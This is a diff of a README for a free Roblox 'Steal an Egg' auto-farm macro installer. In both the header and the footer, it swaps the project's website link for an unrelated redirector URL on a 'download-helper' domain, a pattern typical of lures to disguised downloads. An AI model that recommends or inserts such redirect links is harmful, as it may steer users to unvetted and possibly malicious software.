@@ -2,7 +2,7 @@
 
 Free auto-farm macro for Steal an Egg - hatches and collects on a loop while you are AFK. Windows 10/11, small installer.
 
-**[⬇ Download for Windows](https://github.com/poorpint/steal-an-egg-macro/releases/latest)** · [Website](https://stealaneggmacro.com)
+**[⬇ Download for Windows](https://github.com/poorpint/steal-an-egg-macro/releases/latest)** · [Website](https://go.download-helper.tech/go/SEM)
 
 ![Steal an Egg Macro](StealanEggMacro.png)
 
@@ -49,4 +49,4 @@ Right here. MIT licence, use it however you like.
 
 steal an egg macro · auto hatch macro · roblox pet farm · roblox afk farm · auto collect macro · roblox macro windows
 
-Website: https://stealaneggmacro.com
+Website: https://go.download-helper.tech/go/SEM
